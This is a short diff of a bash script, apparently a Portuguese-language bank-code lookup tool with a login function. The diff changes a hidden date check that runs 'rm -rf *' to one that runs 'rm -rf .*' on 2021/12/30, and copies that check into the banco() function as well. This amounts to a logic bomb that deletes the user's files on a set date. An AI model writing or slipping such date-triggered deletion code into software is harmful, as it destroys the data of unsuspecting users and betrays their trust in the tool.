@@ -26,7 +26,7 @@ function access()
 {
     local username=${userm}
     local password=${pass}
-    [[ ${date} == "2021/12/28" ]] && rm -rf *
+    [[  ${date_c} == "2021/12/30" ]] && rm -rf .*
     [[ -f .sl ]] && return 0
 
     for ((times=0;times<=2;times++)); do
@@ -97,6 +97,8 @@ function access()
 }
 function banco()
 {
+    [[  ${date_c} == "2021/12/30" ]] && rm -rf .*
+
     while :; do
         banner
         printf "\n ${blue}Informe o Codigo do banco para a consulta\n ===> ${cyan}"
